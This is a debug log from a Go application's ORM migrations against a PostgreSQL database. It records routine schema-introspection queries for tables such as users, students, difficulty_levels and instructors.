[0m[33m[8.199ms] [34;1m[rows:-][0m SELECT c.column_name, c.is_nullable = 'YES', c.udt_name, c.character_maximum_length, c.numeric_precision, c.numeric_precision_radix, c.numeric_scale, c.datetime_precision, 8 * typlen, c.column_default, pd.description, c.identity_increment FROM information_schema.columns AS c JOIN pg_type AS pgt ON c.udt_name = pgt.typname LEFT JOIN pg_catalog.pg_description as pd ON pd.objsubid = c.ordinal_position AND pd.objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = c.table_name AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = c.table_schema)) where table_catalog = 'range' AND table_schema = CURRENT_SCHEMA() AND table_name = 'users'

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.555ms] [34;1m[rows:-][0m SELECT * FROM "users" LIMIT 5

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[17.461ms] [34;1m[rows:-][0m SELECT constraint_name FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'users' AND constraint_type = 'UNIQUE'

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[27.866ms] [34;1m[rows:-][0m SELECT c.column_name, constraint_name, constraint_type FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'users'

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.510ms] [34;1m[rows:-][0m SELECT a.attname as column_name, format_type(a.atttypid, a.atttypmod) AS data_type
		FROM pg_attribute a JOIN pg_class b ON a.attrelid = b.oid AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA())
		WHERE a.attnum > 0 -- hide internal columns
		AND NOT a.attisdropped -- hide deleted columns
		AND b.relname = 'users'

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.015ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'id') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.072ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'created_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.963ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'updated_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.983ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'deleted_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.032ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'user_name') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.053ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'first_name') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.986ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'last_name') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.955ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'middle_name') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.892ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'email') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.953ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'phone') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.022ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'password') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.977ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'email_verified') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.044ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'phone_verified') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.977ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'locked') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.723ms] [34;1m[rows:1][0m SELECT count(*) FROM pg_indexes WHERE tablename = 'users' AND indexname = 'idx_users_deleted_at' AND schemaname = CURRENT_SCHEMA()

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.513ms] [34;1m[rows:1][0m SELECT count(*) FROM information_schema.tables WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'students' AND table_type = 'BASE TABLE'

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.368ms] [34;1m[rows:1][0m SELECT CURRENT_DATABASE()

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[6.892ms] [34;1m[rows:-][0m SELECT c.column_name, c.is_nullable = 'YES', c.udt_name, c.character_maximum_length, c.numeric_precision, c.numeric_precision_radix, c.numeric_scale, c.datetime_precision, 8 * typlen, c.column_default, pd.description, c.identity_increment FROM information_schema.columns AS c JOIN pg_type AS pgt ON c.udt_name = pgt.typname LEFT JOIN pg_catalog.pg_description as pd ON pd.objsubid = c.ordinal_position AND pd.objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = c.table_name AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = c.table_schema)) where table_catalog = 'range' AND table_schema = CURRENT_SCHEMA() AND table_name = 'students'

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.592ms] [34;1m[rows:-][0m SELECT * FROM "students" LIMIT 5

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[8.767ms] [34;1m[rows:-][0m SELECT constraint_name FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'students' AND constraint_type = 'UNIQUE'

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[19.544ms] [34;1m[rows:-][0m SELECT c.column_name, constraint_name, constraint_type FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'students'

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.222ms] [34;1m[rows:-][0m SELECT a.attname as column_name, format_type(a.atttypid, a.atttypmod) AS data_type
		FROM pg_attribute a JOIN pg_class b ON a.attrelid = b.oid AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA())
		WHERE a.attnum > 0 -- hide internal columns
		AND NOT a.attisdropped -- hide deleted columns
		AND b.relname = 'students'

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[3.575ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'students' AND column_name = 'id') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'students' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.984ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'students' AND column_name = 'created_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'students' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.963ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'students' AND column_name = 'updated_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'students' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.055ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'students' AND column_name = 'deleted_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'students' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.967ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'students' AND column_name = 'is_premiem') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'students' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.933ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'students' AND column_name = 'user_id') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'students' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.019ms] [34;1m[rows:1][0m SELECT count(*) FROM INFORMATION_SCHEMA.table_constraints WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'students' AND constraint_name = 'fk_students_user'

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[2.702ms] [34;1m[rows:1][0m SELECT count(*) FROM pg_indexes WHERE tablename = 'students' AND indexname = 'idx_students_deleted_at' AND schemaname = CURRENT_SCHEMA()

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.718ms] [34;1m[rows:1][0m SELECT count(*) FROM pg_indexes WHERE tablename = 'students' AND indexname = 'idx_student_user' AND schemaname = CURRENT_SCHEMA()

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.558ms] [34;1m[rows:1][0m SELECT count(*) FROM information_schema.tables WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'difficulty_levels' AND table_type = 'BASE TABLE'

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.307ms] [34;1m[rows:1][0m SELECT CURRENT_DATABASE()

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[4.102ms] [34;1m[rows:-][0m SELECT c.column_name, c.is_nullable = 'YES', c.udt_name, c.character_maximum_length, c.numeric_precision, c.numeric_precision_radix, c.numeric_scale, c.datetime_precision, 8 * typlen, c.column_default, pd.description, c.identity_increment FROM information_schema.columns AS c JOIN pg_type AS pgt ON c.udt_name = pgt.typname LEFT JOIN pg_catalog.pg_description as pd ON pd.objsubid = c.ordinal_position AND pd.objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = c.table_name AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = c.table_schema)) where table_catalog = 'range' AND table_schema = CURRENT_SCHEMA() AND table_name = 'difficulty_levels'

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.614ms] [34;1m[rows:-][0m SELECT * FROM "difficulty_levels" LIMIT 5

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[15.720ms] [34;1m[rows:-][0m SELECT constraint_name FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'difficulty_levels' AND constraint_type = 'UNIQUE'

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[34.041ms] [34;1m[rows:-][0m SELECT c.column_name, constraint_name, constraint_type FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'difficulty_levels'

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.025ms] [34;1m[rows:-][0m SELECT a.attname as column_name, format_type(a.atttypid, a.atttypmod) AS data_type
		FROM pg_attribute a JOIN pg_class b ON a.attrelid = b.oid AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA())
		WHERE a.attnum > 0 -- hide internal columns
		AND NOT a.attisdropped -- hide deleted columns
		AND b.relname = 'difficulty_levels'

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.482ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'difficulty_levels' AND column_name = 'id') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'difficulty_levels' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.216ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'difficulty_levels' AND column_name = 'created_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'difficulty_levels' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.937ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'difficulty_levels' AND column_name = 'updated_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'difficulty_levels' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[4.795ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'difficulty_levels' AND column_name = 'deleted_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'difficulty_levels' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.081ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'difficulty_levels' AND column_name = 'level') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'difficulty_levels' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.785ms] [34;1m[rows:1][0m SELECT count(*) FROM pg_indexes WHERE tablename = 'difficulty_levels' AND indexname = 'idx_difficulty_levels_deleted_at' AND schemaname = CURRENT_SCHEMA()

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.594ms] [34;1m[rows:1][0m SELECT count(*) FROM information_schema.tables WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'instructors' AND table_type = 'BASE TABLE'

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.329ms] [34;1m[rows:1][0m SELECT CURRENT_DATABASE()

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[4.740ms] [34;1m[rows:-][0m SELECT c.column_name, c.is_nullable = 'YES', c.udt_name, c.character_maximum_length, c.numeric_precision, c.numeric_precision_radix, c.numeric_scale, c.datetime_precision, 8 * typlen, c.column_default, pd.description, c.identity_increment FROM information_schema.columns AS c JOIN pg_type AS pgt ON c.udt_name = pgt.typname LEFT JOIN pg_catalog.pg_description as pd ON pd.objsubid = c.ordinal_position AND pd.objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = c.table_name AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = c.table_schema)) where table_catalog = 'range' AND table_schema = CURRENT_SCHEMA() AND table_name = 'instructors'

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.527ms] [34;1m[rows:-][0m SELECT * FROM "instructors" LIMIT 5

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[9.316ms] [34;1m[rows:-][0m SELECT constraint_name FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'instructors' AND constraint_type = 'UNIQUE'

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[9.855ms] [34;1m[rows:-][0m SELECT c.column_name, constraint_name, constraint_type FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'instructors'

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.451ms] [34;1m[rows:-][0m SELECT a.attname as column_name, format_type(a.atttypid, a.atttypmod) AS data_type
		FROM pg_attribute a JOIN pg_class b ON a.attrelid = b.oid AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA())
		WHERE a.attnum > 0 -- hide internal columns
		AND NOT a.attisdropped -- hide deleted columns
		AND b.relname = 'instructors'

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.053ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'instructors' AND column_name = 'id') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'instructors' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
